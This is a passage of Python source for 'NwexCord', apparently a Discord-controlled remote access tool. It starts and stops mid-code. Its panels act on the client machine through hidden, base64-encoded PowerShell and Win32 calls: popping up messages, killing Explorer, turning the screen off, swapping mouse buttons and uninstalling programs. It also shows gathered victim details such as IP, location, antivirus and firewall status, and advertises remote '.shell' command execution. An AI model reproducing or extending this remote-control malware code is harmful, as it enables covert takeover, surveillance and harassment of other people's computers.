    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        new_progs = InstalledProgramsManager.get_programs()
        embed, progs, pg, tp = build_programs_embed(self.session_id, 0, new_progs)
        view = InstalledProgramsView(self.session_id, 0, new_progs)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Uninstall", emoji="\ud83d\udeab", style=discord.ButtonStyle.danger, row=1)
    async def uninstall_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.selected_idx < 0 or self.selected_idx >= len(self.programs_data):
            await interaction.response.send_message("\u274c Please select a program first!", ephemeral=True)
            return
        
        target = self.programs_data[self.selected_idx]
        success, msg = InstalledProgramsManager.uninstall_program(target['name'])
        
        embed, progs, pg, tp = build_programs_embed(self.session_id, self.page, self.programs_data)
        
        if success:
            embed.add_field(name="\u2705 Uninstall", value=f"`{target['name']}`", inline=False)
        else:
            embed.add_field(name="\u274c Failed", value=f"`{target['name']}` \u2014 {msg}", inline=False)
        
        view = InstalledProgramsView(self.session_id, self.page, self.programs_data)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Back to Tools", emoji="\u2b05", style=discord.ButtonStyle.secondary, row=1)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())


# ========================================
# Fun Panel
# ========================================

class FunManager:
    """Helper class for Fun panel operations."""
    
    @staticmethod
    def open_url(url: str):
        try:
            webbrowser.open(url)
            return True, f"Opened: {url}"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def show_messagebox(title: str, message: str, icon="Information", button="OK"):
        try:
            icon_flags = {"Information": 0x40, "Error": 0x10, "Warning": 0x30, "Question": 0x20}
            button_flags = {"OK": 0x0, "OKCancel": 0x01, "YesNo": 0x04, "YesNoCancel": 0x03, "RetryCancel": 0x05, "AbortRetryIgnore": 0x02}
            flags = icon_flags.get(icon, 0x40) | button_flags.get(button, 0x0) | 0x00040000
            WS_EX_TOOLWINDOW = 0x00000080
            WS_POPUP = 0x80000000
            hwnd = ctypes.windll.user32.CreateWindowExW(WS_EX_TOOLWINDOW, "Static", "", WS_POPUP, 0, 0, 0, 0, 0, 0, 0, 0)
            result = ctypes.windll.user32.MessageBoxW(hwnd, message, title, flags)
            ctypes.windll.user32.DestroyWindow(hwnd)
            return True, f"MessageBox shown. Result: {result}"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def show_balloon_tip(title: str, text: str, icon="Info"):
        try:
            icon_map = {"Info": "Info", "Warning": "Warning", "Error": "Error", "None": "None"}
            ps_icon = icon_map.get(icon, "Info")
            title_esc = title.replace("'", "''")
            text_esc = text.replace("'", "''")
            script = (
                f"Add-Type -AssemblyName System.Windows.Forms\n"
                f"Add-Type -AssemblyName System.Drawing\n"
                f"$n = New-Object System.Windows.Forms.NotifyIcon\n"
                f"$n.Icon = [System.Drawing.SystemIcons]::Information\n"
                f"$n.BalloonTipTitle = '{title_esc}'\n"
                f"$n.BalloonTipText = '{text_esc}'\n"
                f"$n.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::{ps_icon}\n"
                f"$n.Visible = $true\n"
                f"$n.ShowBalloonTip(5000)\n"
                f"Start-Sleep -Seconds 6\n"
                f"$n.Dispose()"
            )
            encoded = base64.b64encode(script.encode('utf-16-le')).decode()
            subprocess.Popen(f'powershell -WindowStyle Hidden -EncodedCommand {encoded}', shell=True, creationflags=0x08000000)
            return True, f"BalloonTip shown: {title}"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def client_chat_input(message: str):
        """Show an InputBox on client and return the typed response."""
        try:
            msg_esc = message.replace("'", "''")
            script = f"Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox('{msg_esc}', 'NwexCord Chat')"
            encoded = base64.b64encode(script.encode('utf-16-le')).decode()
            result = subprocess.run(
                f'powershell -WindowStyle Hidden -EncodedCommand {encoded}',
                shell=True, capture_output=True, text=True, timeout=300,
                encoding='utf-8', errors='replace'
            )
            response = result.stdout.strip()
            return response if response else None
        except Exception:
            return None
    
    @staticmethod
    def clock_show():
        try:
            tray = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            notify = ctypes.windll.user32.FindWindowExW(tray, 0, "TrayNotifyWnd", None)
            clock = ctypes.windll.user32.FindWindowExW(notify, 0, "TrayClockWClass", None)
            if clock:
                ctypes.windll.user32.ShowWindow(clock, 5)
                return True, "Clock shown."
            return False, "Clock window not found."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def clock_hide():
        try:
            tray = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            notify = ctypes.windll.user32.FindWindowExW(tray, 0, "TrayNotifyWnd", None)
            clock = ctypes.windll.user32.FindWindowExW(notify, 0, "TrayClockWClass", None)
            if clock:
                ctypes.windll.user32.ShowWindow(clock, 0)
                return True, "Clock hidden."
            return False, "Clock window not found."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def explorer_kill():
        try:
            subprocess.run('taskkill /F /IM explorer.exe', shell=True, timeout=10, capture_output=True, text=True)
            return True, "Explorer killed."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def explorer_start():
        try:
            subprocess.Popen('explorer.exe', shell=True)
            return True, "Explorer started."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def desktop_icons_show():
        try:
            progman = ctypes.windll.user32.FindWindowW("Progman", "Program Manager")
            defview = ctypes.windll.user32.FindWindowExW(progman, 0, "SHELLDLL_DefView", None)
            if not defview:
                from ctypes import wintypes
                WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
                found = [0]
                def cb(hwnd, lp):
                    dv = ctypes.windll.user32.FindWindowExW(hwnd, 0, "SHELLDLL_DefView", None)
                    if dv: found[0] = dv; return False
                    return True
                ctypes.windll.user32.EnumWindows(WNDENUMPROC(cb), 0)
                defview = found[0]
            if defview:
                lv = ctypes.windll.user32.FindWindowExW(defview, 0, "SysListView32", None)
                if lv:
                    ctypes.windll.user32.ShowWindow(lv, 5)
                    return True, "Desktop icons shown."
            return False, "Desktop view not found."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def desktop_icons_hide():
        try:
            progman = ctypes.windll.user32.FindWindowW("Progman", "Program Manager")
            defview = ctypes.windll.user32.FindWindowExW(progman, 0, "SHELLDLL_DefView", None)
            if not defview:
                from ctypes import wintypes
                WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
                found = [0]
                def cb(hwnd, lp):
                    dv = ctypes.windll.user32.FindWindowExW(hwnd, 0, "SHELLDLL_DefView", None)
                    if dv: found[0] = dv; return False
                    return True
                ctypes.windll.user32.EnumWindows(WNDENUMPROC(cb), 0)
                defview = found[0]
            if defview:
                lv = ctypes.windll.user32.FindWindowExW(defview, 0, "SysListView32", None)
                if lv:
                    ctypes.windll.user32.ShowWindow(lv, 0)
                    return True, "Desktop icons hidden."
            return False, "Desktop view not found."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def screen_off():
        try:
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
            return True, "Screen turned off."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def screen_on():
        try:
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
            ctypes.windll.user32.mouse_event(0x0001, 0, 1, 0, 0)
            return True, "Screen turned on."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def swap_mouse_normal():
        try:
            ctypes.windll.user32.SwapMouseButton(False)
            return True, "Mouse buttons set to normal."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def swap_mouse_swap():
        try:
            ctypes.windll.user32.SwapMouseButton(True)
            return True, "Mouse buttons swapped."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def text_speak(text: str):
        try:
            text_escaped = text.replace("'", "''")
            script = f"$voice = New-Object -ComObject SAPI.SpVoice; $voice.Speak('{text_escaped}')"
            encoded = base64.b64encode(script.encode('utf-16-le')).decode()
            subprocess.Popen(f'powershell -WindowStyle Hidden -EncodedCommand {encoded}', shell=True, creationflags=0x08000000)
            return True, f"Speaking: {text}"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def volume_up():
        try:
            for _ in range(13):
                ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)
                ctypes.windll.user32.keybd_event(0xAF, 0, 0x0002, 0)
            return True, "Volume +25%"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def volume_down():
        try:
            for _ in range(13):
                ctypes.windll.user32.keybd_event(0xAE, 0, 0, 0)
                ctypes.windll.user32.keybd_event(0xAE, 0, 0x0002, 0)
            return True, "Volume -25%"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def volume_mute():
        try:
            ctypes.windll.user32.keybd_event(0xAD, 0, 0, 0)
            ctypes.windll.user32.keybd_event(0xAD, 0, 0x0002, 0)
            return True, "Volume muted/unmuted."
        except Exception as e:
            return False, str(e)


def embed_fun_panel():
    embed = discord.Embed(
        title="\U0001f389 NwexCord Fun",
        description=(
            "Select a fun action from the buttons below!\n\n"
            "\U0001f310 Open URL \u2022 \U0001f4ac Client Chat \u2022 \U0001f4e6 MessageBox \u2022 \U0001f5e3\ufe0f Text Speak\n"
            "\U0001f550 Clock \u2022 \U0001f4fa Screen \u2022 \U0001f4c1 Explorer\n"
            "\U0001f5a5\ufe0f Desktop \u2022 \U0001f5b1\ufe0f Mouse \u2022 \U0001f50a Volume"
        ),
        color=discord.Color.from_rgb(255, 85, 85)
    )
    embed.set_footer(text="NwexCord \u2022 Fun Panel")
    return embed


class OpenURLModal(discord.ui.Modal, title="Open URL"):
    url_input = discord.ui.TextInput(label="URL", placeholder="https://example.com", required=True)
    async def on_submit(self, interaction: discord.Interaction):
        url = str(self.url_input).strip()
        if not url.startswith("http"): url = "https://" + url
        success, msg = FunManager.open_url(url)
        e = discord.Embed(title=f"{'✅' if success else '❌'} Open URL", description=msg, color=discord.Color.green() if success else discord.Color.red())
        e.set_footer(text="NwexCord • Fun")
        await interaction.response.edit_message(content=None, embed=e, view=FunResultView())

def build_chat_embed(chat_history, waiting=False):
    desc = ""
    for sender, msg in chat_history[-15:]:
        desc += f"**{sender}:** {msg}\n"
    if waiting:
        desc += "\n\u23f3 *Waiting for client response...*"
    if not desc:
        desc = "*Start a conversation! Click Send to send a message to the client.*"
    e = discord.Embed(title="\U0001f4ac Client Chat", description=desc, color=discord.Color.from_rgb(0, 180, 255))
    e.set_footer(text=f"NwexCord \u2022 Chat \u2022 {len(chat_history)} messages")
    return e

class ClientChatSendModal(discord.ui.Modal, title="Send Message"):
    msg_input = discord.ui.TextInput(label="Message", placeholder="Type your message...", required=True)
    def __init__(self, chat_history):
        super().__init__()
        self.chat_history = chat_history
    async def on_submit(self, interaction: discord.Interaction):
        text = str(self.msg_input)
        self.chat_history.append(("\U0001f9d1\u200d\U0001f4bb You", text))
        embed = build_chat_embed(self.chat_history, waiting=True)
        await interaction.response.edit_message(content=None, embed=embed, view=None)
        loop = asyncio.get_event_loop()
        response = await loop.run_in_executor(None, FunManager.client_chat_input, text)
        if response:
            self.chat_history.append(("\U0001f4bb Client", response))
        else:
            self.chat_history.append(("\U0001f4bb Client", "*(No response)*"))
        embed = build_chat_embed(self.chat_history)
        view = ClientChatView(self.chat_history)
        await interaction.edit_original_response(content=None, embed=embed, view=view)

class ClientChatView(discord.ui.View):
    def __init__(self, chat_history=None):
        super().__init__(timeout=600)
        self.chat_history = chat_history if chat_history is not None else []
    @discord.ui.button(label="Send", emoji="\U0001f4e4", style=discord.ButtonStyle.success)
    async def send_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(ClientChatSendModal(self.chat_history))
    @discord.ui.button(label="Clear", emoji="\U0001f5d1\ufe0f", style=discord.ButtonStyle.danger)
    async def clear_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.chat_history.clear()
        await interaction.response.edit_message(content=None, embed=build_chat_embed(self.chat_history), view=ClientChatView(self.chat_history))
    @discord.ui.button(label="\u2b05 Back", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())


class TextSpeakModal(discord.ui.Modal, title="Text to Speech"):
    text_input = discord.ui.TextInput(label="Text", placeholder="Enter text to speak...", style=discord.TextStyle.paragraph, required=True)
    async def on_submit(self, interaction: discord.Interaction):
        text = str(self.text_input)
        success, msg = FunManager.text_speak(text)
        e = discord.Embed(title=f"{'✅' if success else '❌'} Text Speak", description=msg, color=discord.Color.green() if success else discord.Color.red())
        e.set_footer(text="NwexCord • Fun")
        await interaction.response.edit_message(content=None, embed=e, view=FunResultView())

# --- MessageBox System (with tabs: MessageBox + BalloonTooltip) ---

class MessageBoxSendModal(discord.ui.Modal, title="MessageBox"):
    title_input = discord.ui.TextInput(label="Title", placeholder="MessageBox", default="MessageBox", required=True)
    message_input = discord.ui.TextInput(label="Message", placeholder="Hello World!", style=discord.TextStyle.paragraph, required=True)
    def __init__(self, icon="Information", button="OK"):
        super().__init__()
        self.icon = icon
        self.button = button
    async def on_submit(self, interaction: discord.Interaction):
        t, m = str(self.title_input), str(self.message_input)
        threading.Thread(target=FunManager.show_messagebox, args=(t, m, self.icon, self.button), daemon=True).start()
        e = discord.Embed(title="📦 MessageBox", description=f"**Icon:** {self.icon}\n**Button:** {self.button}\n**Title:** `{t}`\n**Message:** `{m}`", color=discord.Color.green())
        e.set_footer(text="NwexCord • Fun")
        await interaction.response.edit_message(content=None, embed=e, view=FunResultView())

class BalloonTipSendModal(discord.ui.Modal, title="BalloonTooltip"):
    title_input = discord.ui.TextInput(label="Title", placeholder="BalloonTip", default="BalloonTip", required=True)
    text_input = discord.ui.TextInput(label="Text", placeholder="Hello World!", style=discord.TextStyle.paragraph, required=True)
    def __init__(self, icon="Info"):
        super().__init__()
        self.icon = icon
    async def on_submit(self, interaction: discord.Interaction):
        t, tx = str(self.title_input), str(self.text_input)
        FunManager.show_balloon_tip(t, tx, self.icon)
        e = discord.Embed(title="🔔 BalloonTooltip", description=f"**Icon:** {self.icon}\n**Title:** `{t}`\n**Text:** `{tx}`", color=discord.Color.green())
        e.set_footer(text="NwexCord • Fun")
        await interaction.response.edit_message(content=None, embed=e, view=FunResultView())

class MsgBoxIconSelect(discord.ui.Select):
    def __init__(self, default="Information"):
        options = [discord.SelectOption(label=v, value=v, default=(v == default)) for v in ["Information", "Error", "Warning", "Question"]]
        super().__init__(placeholder="MessageBoxIcon", options=options, row=1)
    async def callback(self, interaction: discord.Interaction):
        self.view.selected_icon = self.values[0]
        await interaction.response.defer()

class MsgBoxButtonSelect(discord.ui.Select):
    def __init__(self, default="OK"):
        options = [discord.SelectOption(label=v, value=v, default=(v == default)) for v in ["OK", "OKCancel", "YesNo", "YesNoCancel", "RetryCancel", "AbortRetryIgnore"]]
        super().__init__(placeholder="MessageBoxButton", options=options, row=2)
    async def callback(self, interaction: discord.Interaction):
        self.view.selected_button = self.values[0]
        await interaction.response.defer()

class MessageBoxTabView(discord.ui.View):
    def __init__(self, icon="Information", button="OK"):
        super().__init__(timeout=300)
        self.selected_icon = icon
        self.selected_button = button
        self.add_item(MsgBoxIconSelect(icon))
        self.add_item(MsgBoxButtonSelect(button))
    @discord.ui.button(label="📦 MessageBox", style=discord.ButtonStyle.primary, disabled=True, row=0)
    async def tab_msgbox(self, interaction: discord.Interaction, button: discord.ui.Button): pass
    @discord.ui.button(label="🔔 BalloonTooltip", style=discord.ButtonStyle.secondary, row=0)
    async def tab_balloon(self, interaction: discord.Interaction, button: discord.ui.Button):
        e = discord.Embed(title="🔔 BalloonTooltip", description="Configure and send a BalloonTooltip notification.", color=discord.Color.from_rgb(255, 85, 85))
        e.set_footer(text="NwexCord • Fun")
        await interaction.response.edit_message(content=None, embed=e, view=BalloonTipTabView())
    @discord.ui.button(label="📤 Send", style=discord.ButtonStyle.success, row=3)
    async def send_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(MessageBoxSendModal(self.selected_icon, self.selected_button))
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=3)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

class BalloonIconSelect(discord.ui.Select):
    def __init__(self, default="Info"):
        options = [discord.SelectOption(label=v, value=v, default=(v == default)) for v in ["Info", "Warning", "Error", "None"]]
        super().__init__(placeholder="Icon", options=options, row=1)
    async def callback(self, interaction: discord.Interaction):
        self.view.selected_icon = self.values[0]
        await interaction.response.defer()

class BalloonTipTabView(discord.ui.View):
    def __init__(self, icon="Info"):
        super().__init__(timeout=300)
        self.selected_icon = icon
        self.add_item(BalloonIconSelect(icon))
    @discord.ui.button(label="📦 MessageBox", style=discord.ButtonStyle.secondary, row=0)
    async def tab_msgbox(self, interaction: discord.Interaction, button: discord.ui.Button):
        e = discord.Embed(title="📦 MessageBox", description="Configure and send a MessageBox to the client.", color=discord.Color.from_rgb(255, 85, 85))
        e.set_footer(text="NwexCord • Fun")
        await interaction.response.edit_message(content=None, embed=e, view=MessageBoxTabView())
    @discord.ui.button(label="🔔 BalloonTooltip", style=discord.ButtonStyle.primary, disabled=True, row=0)
    async def tab_balloon(self, interaction: discord.Interaction, button: discord.ui.Button): pass
    @discord.ui.button(label="📤 Send", style=discord.ButtonStyle.success, row=2)
    async def send_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(BalloonTipSendModal(self.selected_icon))
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=2)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

# --- Sub-Panel Views ---

def _fun_sub_embed(title, status_msg=None, success=None):
    e = discord.Embed(title=title, color=discord.Color.from_rgb(255, 85, 85))
    if status_msg:
        e.description = f"{'✅' if success else '❌'} {status_msg}"
    e.set_footer(text="NwexCord • Fun")
    return e

class ClockPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
    @discord.ui.button(label="Show", emoji="👁️", style=discord.ButtonStyle.success)
    async def show_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.clock_show()
        await interaction.response.edit_message(embed=_fun_sub_embed("🕐 Clock", m, s), view=ClockPanelView())
    @discord.ui.button(label="Hide", emoji="🙈", style=discord.ButtonStyle.danger)
    async def hide_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.clock_hide()
        await interaction.response.edit_message(embed=_fun_sub_embed("🕐 Clock", m, s), view=ClockPanelView())
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

class ScreenPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
    @discord.ui.button(label="On", emoji="💡", style=discord.ButtonStyle.success)
    async def on_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.screen_on()
        await interaction.response.edit_message(embed=_fun_sub_embed("📺 Screen", m, s), view=ScreenPanelView())
    @discord.ui.button(label="Off", emoji="🌑", style=discord.ButtonStyle.danger)
    async def off_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.screen_off()
        await interaction.response.edit_message(embed=_fun_sub_embed("📺 Screen", m, s), view=ScreenPanelView())
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

class ExplorerPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
    @discord.ui.button(label="Kill", emoji="💀", style=discord.ButtonStyle.danger)
    async def kill_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.explorer_kill()
        await interaction.response.edit_message(embed=_fun_sub_embed("📁 Explorer", m, s), view=ExplorerPanelView())
    @discord.ui.button(label="Start", emoji="🚀", style=discord.ButtonStyle.success)
    async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.explorer_start()
        await interaction.response.edit_message(embed=_fun_sub_embed("📁 Explorer", m, s), view=ExplorerPanelView())
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

class DesktopPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
    @discord.ui.button(label="Show", emoji="👁️", style=discord.ButtonStyle.success)
    async def show_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.desktop_icons_show()
        await interaction.response.edit_message(embed=_fun_sub_embed("🖥️ Desktop Icons", m, s), view=DesktopPanelView())
    @discord.ui.button(label="Hide", emoji="🙈", style=discord.ButtonStyle.danger)
    async def hide_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.desktop_icons_hide()
        await interaction.response.edit_message(embed=_fun_sub_embed("🖥️ Desktop Icons", m, s), view=DesktopPanelView())
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

class MousePanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
    @discord.ui.button(label="Normal", emoji="🖱️", style=discord.ButtonStyle.success)
    async def normal_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.swap_mouse_normal()
        await interaction.response.edit_message(embed=_fun_sub_embed("🖱️ Mouse", m, s), view=MousePanelView())
    @discord.ui.button(label="Swap", emoji="🔄", style=discord.ButtonStyle.danger)
    async def swap_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.swap_mouse_swap()
        await interaction.response.edit_message(embed=_fun_sub_embed("🖱️ Mouse", m, s), view=MousePanelView())
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

class VolumePanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
    @discord.ui.button(label="Vol +25%", emoji="🔊", style=discord.ButtonStyle.success)
    async def up_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.volume_up()
        await interaction.response.edit_message(embed=_fun_sub_embed("🔊 Volume", m, s), view=VolumePanelView())
    @discord.ui.button(label="Vol -25%", emoji="🔉", style=discord.ButtonStyle.secondary)
    async def down_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.volume_down()
        await interaction.response.edit_message(embed=_fun_sub_embed("🔉 Volume", m, s), view=VolumePanelView())
    @discord.ui.button(label="Mute", emoji="🔇", style=discord.ButtonStyle.danger)
    async def mute_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.volume_mute()
        await interaction.response.edit_message(embed=_fun_sub_embed("🔇 Volume", m, s), view=VolumePanelView())
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

# --- Fun Result & Main Panel ---

class FunResultView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
    @discord.ui.button(label="Back to Fun", emoji="⬅", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

class FunPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
    # Row 0: Modal actions
    @discord.ui.button(label="Open URL", emoji="🌐", style=discord.ButtonStyle.primary, row=0)
    async def open_url_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(OpenURLModal())
    @discord.ui.button(label="Client Chat", emoji="\U0001f4ac", style=discord.ButtonStyle.primary, row=0)
    async def client_chat_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=build_chat_embed([]), view=ClientChatView())
    @discord.ui.button(label="MessageBox", emoji="📦", style=discord.ButtonStyle.primary, row=0)
    async def messagebox_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        e = discord.Embed(title="📦 MessageBox", description="Configure and send a MessageBox to the client.", color=discord.Color.from_rgb(255, 85, 85))
        e.set_footer(text="NwexCord • Fun")
        await interaction.response.edit_message(content=None, embed=e, view=MessageBoxTabView())
    @discord.ui.button(label="Text Speak", emoji="🗣️", style=discord.ButtonStyle.primary, row=0)
    async def textspeak_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(TextSpeakModal())
    # Row 1: Sub-panel features
    @discord.ui.button(label="Clock", emoji="🕐", style=discord.ButtonStyle.secondary, row=1)
    async def clock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("🕐 Clock"), view=ClockPanelView())
    @discord.ui.button(label="Screen", emoji="📺", style=discord.ButtonStyle.secondary, row=1)
    async def screen_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("📺 Screen"), view=ScreenPanelView())
    @discord.ui.button(label="Explorer", emoji="📁", style=discord.ButtonStyle.secondary, row=1)
    async def explorer_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("📁 Explorer"), view=ExplorerPanelView())
    # Row 2: More sub-panel features
    @discord.ui.button(label="Desktop", emoji="🖥️", style=discord.ButtonStyle.secondary, row=2)
    async def desktop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("🖥️ Desktop Icons"), view=DesktopPanelView())
    @discord.ui.button(label="Mouse", emoji="🖱️", style=discord.ButtonStyle.secondary, row=2)
    async def mouse_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("🖱️ Mouse"), view=MousePanelView())
    @discord.ui.button(label="Volume", emoji="🔊", style=discord.ButtonStyle.secondary, row=2)
    async def volume_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("🔊 Volume"), view=VolumePanelView())
    # Row 3: Back
    @discord.ui.button(label="⬅ Back to Info", style=discord.ButtonStyle.secondary, row=3)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        info = get_sys_info()
        left_col = (
            f"🌐 **IP** : {info.get('IP', 'Unknown')}\n"
            f"👤 **UserName** : {info['UserName']}\n"
            f"🖥️ **PCName** : {info['PCName']}\n"
            f"🪟 **OS** : {info['OS']}\n"
            f"📁 **Client** : {info['Client']}\n"
            f"⚙️ **Process** : {info['Process']}\n"
            f"📅 **DateTime** : {info['DateTime']}\n"
            f"🎇 **GPU** : {info['GPU']}\n"
            f"🧠 **CPU** : {info['CPU']}\n"
            f"🏷️ **Identifier** : {info['Identifier']}\n"
            f"📊 **Ram** : {info['Ram']}"
        )
        right_col = (
            f"📍 **Location** : {info.get('Location', 'Unknown')}\n"
            f"⏱️ **LastReboot** : {info['LastReboot']}\n"
            f"🛡️ **Antivirus** : {info['Antivirus']}\n"
            f"⚠️ **Firewall** : {info['Firewall']}\n"
            f"🌐 **MacAddress** : {info['MacAddress']}\n"
            f"🌍 **DefaultBrowser** : {info['DefaultBrowser']}\n"
            f"🗣️ **CurrentLang** : {info['CurrentLang']}\n"
            f"💻 **Platform** : {info['Platform']}\n"
            f"📋 **Ver** : {info['Ver']}\n"
            f"🔵 **.Net** : {info['.Net']}\n"
            f"🔋 **Battery** : {info['Battery']}"
        )
        embed = discord.Embed(title="[ Information ]", color=discord.Color.dark_theme())
        embed.add_field(name="\u200b", value=left_col, inline=True)
        embed.add_field(name="\u200b", value=right_col, inline=True)
        embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
        msg_content = f"🚀 **NwexCord System Started!**\nUse `.shell <command>` to execute CMD/PowerShell commands on this machine."
        await interaction.response.edit_message(content=msg_content, embed=embed, view=StartupView())


class ToolsPanelView(discord.ui.View):
    """The panel with all 8 tool buttons."""
    def __init__(self):
        super().__init__(timeout=300)
    
    @discord.ui.button(label="Registry Editor", emoji="🔑", style=discord.ButtonStyle.secondary, row=0)
    async def registry_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
        embed = build_registry_embed("", session_id)
        view = RegistryView("", session_id)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Active Windows", emoji="🪟", style=discord.ButtonStyle.secondary, row=0)
    async def activewindows_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
        embed, windows = build_activewindows_embed(session_id)
        view = ActiveWindowsView(session_id)
